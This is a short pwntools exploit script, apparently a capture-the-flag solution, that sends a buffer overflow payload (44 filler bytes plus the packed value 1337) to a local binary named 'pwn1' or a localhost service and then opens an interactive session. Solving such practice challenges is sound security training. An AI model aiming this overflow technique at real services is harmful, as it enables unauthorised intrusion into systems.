#!/usr/bin/env python3
from pwn import *

# Change this to remote if you want to run it on remote server
if args.REMOTE:
    r = remote('localhost', 1337) # change host and port
else:
    r = process('./pwn1')

PAYLOAD = b'A' * 44 + p32(1337)
r.recvuntil(b'?\n')
r.sendline(PAYLOAD + b'\x00')

r.interactive()